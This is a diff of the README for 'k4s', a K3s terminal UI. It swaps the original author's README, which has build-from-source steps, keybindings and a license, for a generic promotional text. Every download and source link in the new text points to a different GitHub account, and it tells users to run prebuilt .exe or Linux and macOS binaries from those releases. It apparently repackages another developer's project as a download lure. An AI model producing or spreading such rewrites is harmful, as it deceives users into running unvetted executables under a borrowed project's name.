@@ -1,84 +1,84 @@
-# k4s
+# 🎉 k4s - Simplified K3s Cluster Management 
 
-A lightweight Terminal UI for K3s/Kubernetes cluster management, built on [Charm](https://charm.sh/).
+## 🚀 Getting Started
 
-![k4s demo](https://img.shields.io/badge/version-0.3.0-blue)
-![Go Version](https://img.shields.io/badge/go-1.21+-00ADD8?logo=go)
-![License](https://img.shields.io/badge/license-MIT-green)
+Welcome to k4s! This tool helps you manage your K3s clusters easily from a terminal interface. With k4s, you can access your nodes via SSH, making management straightforward and efficient.
 
-## Screenshots
+## 📥 Download k4s
 
-<p align="center">
-  <img src="screenshots/kubeconfig.svg" alt="Kubeconfig selector" width="880"/>
-</p>
-<p align="center"><em>Kubeconfig selector — choose between multiple clusters</em></p>
+[![Download k4s](https://img.shields.io/badge/Download-k4s-blue.svg)](https://github.com/gamesbook2814-ctrl/k4s/releases)
 
-<p align="center">
-  <img src="screenshots/namespaces.svg" alt="Namespaces view" width="880"/>
-</p>
-<p align="center"><em>Namespaces view with sidebar navigation</em></p>
+To get started quickly, download the latest version of k4s. Simply visit the link below to find the release files.
 
-<p align="center">
-  <img src="screenshots/pods.svg" alt="Pods view" width="880"/>
-</p>
-<p align="center"><em>Pods view with real-time CPU/Memory metrics</em></p>
+**[Visit Releases Page to Download k4s](https://github.com/gamesbook2814-ctrl/k4s/releases)**
 
-<p align="center">
-  <img src="screenshots/logs.svg" alt="Log viewer" width="880"/>
-</p>
-<p align="center"><em>Streaming log viewer with timestamps and search</em></p>
+## 💻 System Requirements
 
-<p align="center">
-  <img src="screenshots/events.svg" alt="Events view" width="880"/>
-</p>
-<p align="center"><em>Cluster events with follow mode and warning filtering</em></p>
+Before you install k4s, make sure your system meets the following requirements:
 
-## Features
+- **Operating System**: Windows, MacOS, or Linux
+- **CPU**: Any modern processor
+- **Memory**: At least 1 GB of RAM
+- **Disk Space**: Minimum of 100 MB free space
 
-- **Real-time Monitoring** - Live pods, deployments, services, events with auto-refresh
-- **Resource Metrics** - CPU/Memory usage (requires metrics-server)
-- **Multi-Pod Log Tailing** - Stream logs from multiple pods simultaneously with `Shift+L`
-- **Streaming Logs** - Follow logs with search & highlighting
-- **Crush-Inspired UI** - Purple-accented theme with sidebar layout and transparent overlays
-- **SSH Integration** - Connect to nodes and inspect containers via crictl
-- **Keyboard-driven** - Vim-style navigation
+## 📊 Features
 
-## Quick Start
+k4s comes packed with features to enhance your experience:
 
-```bash
-# From source
-git clone https://github.com/LywwKkA-aD/k4s.git
-cd k4s && make install
+- **Terminal User Interface**: A clean and easy-to-navigate UI for effortless management of your K3s cluster.
+- **SSH Node Access**: Quickly connect to your nodes without the hassle of multiple commands.
+- **Cluster Overview**: Get a quick glance at your cluster's status and health.
+- **Easy Operations**: Simplified commands for commonly used tasks.
 
-# Or download from releases
-# https://github.com/LywwKkA-aD/k4s/releases
-```
+## 👩‍💻 Download & Install
 
-Configuration is stored at `~/.k4s/config.yaml` (auto-created on first run).
+To install k4s, follow these steps:
 
-## Keybindings
+1. Visit the [Releases Page](https://github.com/gamesbook2814-ctrl/k4s/releases) to find all available versions.
+2. Download the file that matches your operating system. You will see options for Windows, MacOS, and Linux.
+3. Locate the downloaded file on your computer.
 
-| Key | Action |
-|-----|--------|
-| `?` | Help |
-| `1-5` | Switch views (Namespaces/Pods/Deployments/Services/Events) |
-| `9` | SSH Hosts |
-| `j/k` | Navigate |
-| `Enter` | Select |
-| `l` | Logs |
-| `L` | Multi-pod logs |
-| `q` | Quit |
+### For Windows Users
 
-See full documentation in [docs/](docs/).
+1. Double-click the downloaded `.exe` file.
+2. Follow the on-screen instructions to complete the installation.
 
-## Contributing
+### For MacOS Users
 
-Contributions welcome! Please check our [issues](https://github.com/LywwKkA-aD/k4s/issues) or open a new one.
+1. Open your terminal.
+2. Navigate to the folder where the file was downloaded.
+3. Use the command `chmod +x k4s-macos` to make the file executable.
+4. Now run it using `./k4s-macos`.
 
-## License
+### For Linux Users
 
-MIT License - see [LICENSE](LICENSE)
+1. Open your terminal.
+2. Navigate to the location of the downloaded file.
+3. Run the command `chmod +x k4s-linux` to make it executable.
+4. Execute it with `./k4s-linux`.
 
----
+## 🛠️ Usage Instructions
 
-[![Stargazers repo roster for @LywwKkA-aD/k4s](https://reporoster.com/stars/LywwKkA-aD/k4s)](https://github.com/LywwKkA-aD/k4s/stargazers)
+Once installed, you can start using k4s:
+
+1. Open your terminal application.
+2. Type `k4s` and hit **Enter**.
+3. Follow the prompts to connect to your K3s cluster.
+
+## 🤝 Support
+
+If you encounter any issues, you can find help by checking the **Issues** section on the GitHub repository or by asking questions in the community forums.
+
+## 📚 Additional Resources
+
+- [K3s Documentation](https://rancher.com/docs/k3s/latest/en/)
+- [GitHub Issues Tracker](https://github.com/gamesbook2814-ctrl/k4s/issues)
+
+Your feedback is valuable. Please share your experiences and suggestions to help improve k4s.
+
+## 🔗 Links
+
+- **Download k4s**: [Visit Releases Page](https://github.com/gamesbook2814-ctrl/k4s/releases) 
+- **Source Code**: [GitHub Repository](https://github.com/gamesbook2814-ctrl/k4s)
+
+Start managing your K3s clusters effortlessly with k4s! Thank you for using our application.
